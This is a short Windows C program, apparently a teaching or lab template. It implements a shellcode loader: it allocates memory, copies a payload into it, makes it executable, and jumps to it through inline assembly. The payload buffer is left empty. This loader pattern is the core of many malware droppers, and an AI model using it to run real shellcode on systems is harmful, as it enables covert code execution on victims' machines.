#include <windows.h>

int main(void) {
  void* exec_mem;
  DWORD oldprotect = 0;

  // Payload will be placed on the stack
  unsigned char payload[] = "";
  unsigned int payload_len = sizeof(payload);

  // Allocate some memory to put our payload so we are not executing from stack and stepping on ourselves
  exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  // Copy payload to new buffer
  RtlMoveMemory(exec_mem, payload, payload_len);
  // Make new payload buffer executable
  VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
  __debugbreak();
  __asm__(
    "mov rcx, %[exec_mem] \n"
    "jmp rcx \n"
    : // no output
    :[exec_mem] "r" (exec_mem)
  );
  return 0;
}